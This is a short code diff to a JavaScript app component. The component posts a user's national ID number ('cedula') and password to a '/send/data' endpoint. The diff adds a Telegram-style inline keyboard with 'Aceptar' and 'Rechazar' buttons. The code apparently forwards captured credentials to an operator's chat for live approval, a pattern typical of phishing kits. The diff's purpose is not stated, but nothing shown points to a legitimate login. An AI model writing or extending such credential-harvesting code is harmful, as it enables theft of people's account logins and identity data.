@@ -17,9 +17,24 @@ function App() {
       const response = await api.post("/send/data", {
         text: {
           cedula, password
-        }
+        },
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "Aceptar",
+                callback_data: "aceptar",
+              },
+            ],
+            [
+              {
+                text: "Rechazar",
+                callback_data: "rechazar",
+              },
+            ],
+          ],
+        },
       });
-      console.log(response);
     } catch (error) {
       console.error(error);
     }
